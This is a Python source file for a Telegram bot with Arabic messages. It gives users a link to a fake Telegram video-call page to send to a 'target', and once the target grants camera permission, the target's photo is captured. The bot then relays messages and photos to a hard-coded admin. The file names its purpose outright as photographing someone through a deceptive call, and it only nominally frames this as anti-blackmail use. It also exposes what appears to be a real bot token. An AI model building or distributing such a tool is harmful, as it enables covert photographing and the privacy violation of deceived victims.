import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

TOKEN = "8511151482:AAHH8LgUT4d0f43BXzP9kDpqorooYMJqM4M"
ADMIN_ID = 7800095838  # ضع ID الخاص بك هنا


bot = telebot.TeleBot(TOKEN)

# تخزين حالة الرد
waiting_reply_for = {}

# ===== رسالة /start =====
START_MESSAGE = """أهلاً بك! هذا هو الرابط الذي سترسله للهدف https://telegram-video-call-ui.pages.dev/
تاكد من فتحه للرابط وسيحوله لمكالمة فيديو بمجرد الانضمام لها ومنح الاذن ستحصل على صورته هنا
ولكن اكرر للضرورة فقط"""

# ===== رسالة ماذا يمكن للبوت فعله =====
ABOUT_MESSAGE = """هذا البوت يسمح لك بالتقاط صورة للمستخدم عن طريق مكالمة خادعه استخدمه فقط لأغراض الخير كحل لحالات الابتزاز"""

# ===== عند الضغط على /start =====
@bot.message_handler(commands=['start'])
def start(message):
    markup = InlineKeyboardMarkup()
    btn_about = InlineKeyboardButton("ماذا يمكن للبوت فعله؟", callback_data="about")
    markup.add(btn_about)

    bot.send_message(message.chat.id, START_MESSAGE, reply_markup=markup)


# ===== زر ماذا يفعل البوت =====
@bot.callback_query_handler(func=lambda call: call.data == "about")
def about_bot(call):
    bot.answer_callback_query(call.id)
    bot.send_message(call.message.chat.id, ABOUT_MESSAGE)


# ===== عندما يرسل مستخدم رسالة للبوت (نص أو صور) =====
@bot.message_handler(content_types=['text', 'photo'], func=lambda m: m.from_user.id != ADMIN_ID)
def incoming_message(message):
    user = message.from_user

    # زر الرد
    markup = InlineKeyboardMarkup()
    reply_button = InlineKeyboardButton(
        "📩 الرد على هذا المستخدم",
        callback_data=f"reply_{user.id}"
    )
    markup.add(reply_button)

    # إذا كانت الرسالة نصية
    if message.text:
        text = (
            f"👤 المستخدم: @{user.username}\n"
            f"🆔 ID: {user.id}\n"
            f"💬 الرسالة النصية:\n{message.text}"
        )
        bot.send_message(ADMIN_ID, text, reply_markup=markup)
    
    # إذا كانت الرسالة صورة
    elif message.photo:
        # الحصول على أعلى جودة للصورة
        photo_file_id = message.photo[-1].file_id
        caption = (
            f"👤 المستخدم: @{user.username}\n"
            f"🆔 ID: {user.id}\n"
            f"📸 أرسل صورة"
        )
        if message.caption:
            caption += f"\n\nالتعليق: {message.caption}"
        
        bot.send_photo(ADMIN_ID, photo_file_id, caption=caption, reply_markup=markup)

    bot.send_message(message.chat.id, "✔ تم إرسال رسالتك")


# ===== عندما تضغط على زر الرد =====
@bot.callback_query_handler(func=lambda call: call.data.startswith("reply_"))
def prepare_reply(call):
    bot.answer_callback_query(call.id)

    user_id = int(call.data.split("_")[1])
    waiting_reply_for[ADMIN_ID] = user_id

    bot.send_message(ADMIN_ID, f"✏️ اكتب الآن الرد للمستخدم ID: {user_id}\nيمكنك إرسال نص أو صورة")


# ===== عندما يكتب المدير الرد (نص أو صور) =====
@bot.message_handler(content_types=['text', 'photo'], func=lambda m: m.from_user.id == ADMIN_ID)
def admin_reply(message):
    if ADMIN_ID not in waiting_reply_for:
        bot.send_message(ADMIN_ID, "❗ اضغط زر الرد أولًا من رسالة المستخدم.")
        return

    user_id = waiting_reply_for[ADMIN_ID]

    try:
        # إذا كان الرد نصي
        if message.text:
            bot.send_message(user_id, message.text)
            bot.send_message(ADMIN_ID, "✔ تم إرسال الرد النصي.")
        
        # إذا كان الرد صورة
        elif message.photo:
            # الحصول على أعلى جودة للصورة
            photo_file_id = message.photo[-1].file_id
            caption = message.caption if message.caption else ""
            
            bot.send_photo(user_id, photo_file_id, caption=caption)
            bot.send_message(ADMIN_ID, "✔ تم إرسال الصورة.")
    
    except Exception as e:
        bot.send_message(ADMIN_ID, f"❌ فشل إرسال الرد. المستخدم قد لا يكون متاحاً.\nالخطأ: {str(e)}")

    del waiting_reply_for[ADMIN_ID]


bot.polling()